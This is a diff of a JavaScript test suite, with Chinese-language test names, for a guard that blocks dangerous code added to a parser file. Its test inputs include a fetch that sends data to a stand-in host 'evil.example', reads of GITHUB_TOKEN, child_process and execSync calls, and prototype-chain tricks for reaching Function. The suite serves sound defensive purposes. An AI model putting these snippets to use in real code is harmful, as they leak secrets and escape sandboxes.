@@ -52,11 +52,19 @@ test('改到範圍外的檔案(上傳流程、workflow、套件清單)→ 擋下
 });
 
 test.each([
-  ["const cp = require('child_process');", 'require'],
-  ["fetch('https://evil.example/' + data);", '網路存取'],
-  ['const k = process.env.GITHUB_TOKEN;', 'process'],
-  ["new Function('return 1')();", '動態執行'],
-  ['globalThis.x = 1;', '全域物件'],
+  ["const cp = require('child_process');", '「require」'],
+  ["fetch('https://evil.example/' + data);", '「fetch」'],
+  ['const k = process.env.GITHUB_TOKEN;', '「process」'],
+  ["new Function('return 1')();", '「Function」'],
+  ['globalThis.x = 1;', '「globalThis」'],
+  // 逐行比對時代的漏洞:看起來像註解開頭就整行跳過
+  ["/* 註解 */ require('child_process');", '「require」'],
+  // 原型鏈逃脫:不用任何危險識別字也能拿到 Function
+  ["const f = ''.constructor.constructor;", '「.constructor」'],
+  ["const f = x['con' + 'structor'];", '拼湊的字串'],
+  ["const f = x['constructor'];", '字串含'],
+  ['const c = String.fromCharCode(99);', '「.fromCharCode」'],
+  ["const s = `${a}`; module.require('fs');", '「module」'],
 ])('讀取器新增 %s → 擋下(%s)', (line, label) => {
   write(PARSER, `const x = 395;\n${line}\n`);
   commit();
@@ -67,6 +75,24 @@ test('測試檔也不准連網或執行外部程式', () => {
   write('app/tests/parser-jiumu.test.js', "require('child_process').execSync('curl x');\n");
   commit();
   expect(check(dir, base).length).toBeGreaterThan(0);
+});
+
+test('既有程式本來就有的寫法不算,同一類變多才擋', () => {
+  write(PARSER, "const XLSX = require('xlsx');\n");
+  commit();
+  base = git('rev-parse', 'HEAD');
+  write(PARSER, "const XLSX = require('xlsx');\nconst n = 1;\n");
+  commit();
+  expect(check(dir, base)).toEqual([]);
+  write(PARSER, "const XLSX = require('xlsx');\nconst n = 1;\nconst cp = require('child_process');\n");
+  commit();
+  expect(check(dir, base).join('\n')).toContain('「require」');
+});
+
+test('解析不了的檔案直接拒絕', () => {
+  write(PARSER, 'const x = ;\n');
+  commit();
+  expect(check(dir, base).join('\n')).toContain('無法解析');
 });
 
 test('註解裡提到 require 不算', () => {
